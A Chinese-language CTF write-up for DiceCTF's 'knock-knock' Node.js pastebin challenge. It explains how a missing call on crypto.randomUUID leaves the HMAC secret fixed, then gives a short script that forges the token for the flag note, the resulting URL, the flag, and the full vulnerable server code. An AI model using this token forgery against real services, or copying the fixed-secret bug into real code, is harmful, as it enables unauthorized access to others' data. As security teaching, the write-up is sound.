---
title: DiceCTF - knock-knock
categories: 赛题wp
---

﻿一道nodejs题目，给了源码和dockerfile，从dockerfile知道nodejs版本为17.4.0，一个pastebin

![](https://img-blog.csdnimg.cn/84f1b6cc71694c899d823a1787822232.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_16,color_FFFFFF,t_70,g_se,x_16#pic_center)

<!--more-->
![](https://img-blog.csdnimg.cn/8f2e8c4290df498f9899fda13cec46aa.png#pic_center)

返回可以进行xss，但是不会返回cookie，所以，审计一下代码

代码逻辑很简单flag在**notes[0]**位置上，但是由于每个人返回的token不相同，所以想要伪造token切换到**id=0**看似不可能 

可以发现token生成的主要逻辑是依靠两个部分

```
this.secret = `secret-${crypto.randomUUID}`;
和
return crypto.createHmac('sha256',this.secret).update(id.toString()).digest('hex');
```

当我想要使用我的nodejs14尝试生成一下secret时发现了异常

![](https://img-blog.csdnimg.cn/567fc350d9994e1ea9e83ab96a47ab9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_18,color_FFFFFF,t_70,g_se,x_16#pic_center)

于是就去找到了17版本的在线网站，发现了漏洞，[nodejs-online](https://www.jdoodle.com/execute-nodejs-online/)

![](https://img-blog.csdnimg.cn/e626d5a205864d218527406a216fe4bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

**randomUUID缺少()导致this.secret为固定，这也就给了伪造token的机会**

所以就可以进行伪造token

```
const crypto = require('crypto');
let secret = `secret-${crypto.randomUUID}`;
let id = 0;
console.log(crypto.createHmac('sha256', secret).update(id.toString()).digest('hex'));
```

另一种手动的方法，将错误信息base64编码

```
console.log(btoa(`secret-${crypto.randomUUID}`));
```
生成
```
c2VjcmV0LWZ1bmN0aW9uIHJhbmRvbVVVSUQob3B0aW9ucykgewogIGlmIChvcHRpb25zICE9PSB1bmRlZmluZWQpCiAgICB2YWxpZGF0ZU9iamVjdChvcHRpb25zLCAnb3B0aW9ucycpOwogIGNvbnN0IHsKICAgIGRpc2FibGVFbnRyb3B5Q2FjaGUgPSBmYWxzZSwKICB9ID0gb3B0aW9ucyB8fCB7fTsKCiAgdmFsaWRhdGVCb29sZWFuKGRpc2FibGVFbnRyb3B5Q2FjaGUsICdvcHRpb25zLmRpc2FibGVFbnRyb3B5Q2FjaGUnKTsKCiAgcmV0dXJuIGRpc2FibGVFbnRyb3B5Q2FjaGUgPyBnZXRVbmJ1ZmZlcmVkVVVJRCgpIDogZ2V0QnVmZmVyZWRVVUlEKCk7Cn0=
```
利用 hmac 伪造token

![](https://img-blog.csdnimg.cn/f8fe493fed674edca519586bfdfa0118.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

访问
```
url/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264
```
FLAG：dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r}

代码

```js
const crypto = require('crypto');

class Database {
  constructor() {
    this.notes = [];
    this.secret = `secret-${crypto.randomUUID}`;
  }

  createNote({ data }) {
    const id = this.notes.length;
    this.notes.push(data);
    return {
      id,
      token: this.generateToken(id),
    };
  }

  getNote({ id, token }) {
    if (token !== this.generateToken(id)) return { error: 'invalid token' };
    if (id >= this.notes.length) return { error: 'note not found' };
    return { data: this.notes[id] };
  }

  generateToken(id) {
    return crypto
      .createHmac('sha256', this.secret)
      .update(id.toString())
      .digest('hex');
  }
}

const db = new Database();
db.createNote({ data: process.env.FLAG });

const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: false }));
app.use(express.static('public'));

app.post('/create', (req, res) => {
  const data = req.body.data ?? 'no data provided.';
  const { id, token } = db.createNote({ data: data.toString() });
  res.redirect(`/note?id=${id}&token=${token}`);
});

app.get('/note', (req, res) => {
  const { id, token } = req.query;
  const note = db.getNote({
    id: parseInt(id ?? '-1'),
    token: (token ?? '').toString(),
  });
  if (note.error) {
    res.send(note.error);
  } else {
    res.send(note.data);
  }
});

app.listen(3000, () => {
  console.log('listening on port 3000');
});
```

